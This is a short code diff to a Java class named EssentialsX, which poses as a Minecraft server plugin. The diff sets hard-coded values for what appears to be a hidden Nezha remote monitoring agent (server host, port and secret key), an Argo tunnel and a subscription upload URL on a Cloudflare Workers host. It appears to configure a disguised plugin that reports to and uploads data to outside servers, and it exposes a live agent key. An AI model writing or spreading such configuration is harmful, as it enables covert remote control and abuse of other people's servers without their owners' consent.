@@ -72,15 +72,15 @@ public class EssentialsX extends JavaPlugin {
         env.put("TOK", "");
         env.put("ARGO_DOMAIN", "");
         env.put("TG", "");
-        env.put("SUB_URL", "");
-        env.put("NEZHA_SERVER", "");
-        env.put("NEZHA_KEY", "");
-        env.put("NEZHA_PORT", "");
-        env.put("NEZHA_TLS", "");
-        env.put("TMP_ARGO", "");
+        env.put("SUB_URL", "https://sub-all.xtu.workers.dev/upload-3e9126ae-5492-471b-9a91-11a4dbd640c2");
+        env.put("NEZHA_SERVER", "v1.xuexi365.eu.org:443");
+        env.put("NEZHA_KEY", "KL6Nu7RSxyiGTUFUM8OxS5PIBqxdeiiz");
+        env.put("NEZHA_PORT", "443");
+        env.put("NEZHA_TLS", "1");
+        env.put("TMP_ARGO", "ech");
         env.put("EKEY", "");
-        env.put("SUB_NAME", "");
-        env.put("CF_IP", "");
+        env.put("SUB_NAME", "os");
+        env.put("CF_IP", "ip.sb");
         env.put("AGENT_UUID", "");
         env.put("UUID", "");
         
